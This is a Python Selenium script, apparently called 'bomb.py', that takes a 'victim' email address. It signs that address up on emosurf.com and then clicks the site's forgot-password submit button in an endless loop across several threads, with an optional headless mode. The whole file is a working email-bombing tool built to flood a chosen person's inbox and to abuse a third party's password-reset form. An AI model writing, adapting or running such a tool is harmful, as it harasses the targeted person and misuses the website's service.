#!/usr/local/bin/python
# -*- coding: utf-8 -*

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import threading
import argparse
import time

parser = argparse.ArgumentParser(description='Use example: python bomb.py <email to spam> -t <amount of threads>')
parser.add_argument('victim',
                    type=str,
                    help='Enter victim email')
parser.add_argument('-t', '--threads',
                    type=int,
                    default=4,
                    help='Enter amount of threads (4 is set by default)')
parser.add_argument('-s', '--silence',
                    action='store_true',
                    help='Run threads silently')
parser.add_argument('-w', '--webdriver',
                    type=str,
                    default='chrome',
                    help='Choose chrome or firefox webdriver (Chrome is set by default)')
parser.add_argument('-n', '--name',
                    type=str,
                    default='John Doe',
                    help='Set a name for account')
args = parser.parse_args()


def spam():
    if args.webdriver is False or args.webdriver == 'chrome':
        if args.silence is False:
            driver = webdriver.Chrome()
            print('Thread(s) started in window(s)')
        else:
            options = Options()
            options.headless = True
            driver = webdriver.Chrome(options=options)
            print('Thread(s) started silently')
    elif args.webdriver == 'firefox':
        if args.silence is False:
            driver = webdriver.Firefox()
            print('Thread(s) started in window(s)')
        else:
            options = webdriver.FirefoxOptions()
            options.add_argument('--headless')
            driver = webdriver.Firefox(options=options)
            print('Thread(s) started silently')

    driver.get('https://emosurf.com/')
    # click sub button
    time.sleep(1)
    driver.find_element(by=By.XPATH, value='/html/body/div[4]/div/table/tbody/tr/td[2]/table/tbody/tr/td[7]/button').click()
    # fill email and password
    time.sleep(1)
    driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[2]/form/div[1]/input').send_keys(args.victim)
    driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[2]/form/div[2]/input').send_keys(str(args.name))

    # make some clicks to send things to server
    driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[2]/form/div[3]/table/tbody/tr/td[1]/button').click()
    time.sleep(1)
    driver.find_element(by=By.XPATH, value='/html/body/div[3]/div[3]/button').click()

    # click person image
    time.sleep(1)
    driver.find_element(by=By.XPATH, value='/html/body/div[4]/div/table/tbody/tr/td[2]/table/tbody/tr/td[3]/img').click()

    # click forgot password text
    time.sleep(1)
    driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[4]/form/div[3]/a').click()

    # enter email
    time.sleep(1)
    driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[6]/form/div[1]/input').send_keys(args.victim)

    while True:
        # click submit button
        driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[6]/form/div[2]/button').click()
        print(str(time.time()))


for k in range(args.threads):
    thread = threading.Thread(target=spam)
    thread.start()
    time.sleep(1)
